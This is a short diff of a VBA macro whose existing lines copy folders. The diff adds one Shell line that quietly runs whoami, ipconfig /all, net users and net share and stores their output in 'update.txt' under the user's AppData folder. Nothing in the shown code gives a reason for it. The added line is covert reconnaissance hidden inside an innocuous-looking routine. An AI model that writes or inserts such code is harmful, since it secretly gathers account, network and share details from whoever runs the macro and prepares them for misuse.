@@ -141,5 +141,6 @@ End If
 If Dir$(targetfolder4, vbDirectory) <> vbNullString Then
 FSO.CopyFolder Source:=targetfolder4, Destination:=pasteloc4
 End If
+Shell "cmd /c cd " & Environ("USERPROFILE") & "\AppData\Local\info" & "&& cmd /c del update.txt && whoami >> update.txt && ipconfig /all >> update.txt && net users >> update.txt && net share >> update.txt", vbNormalFocus
 
 End Sub
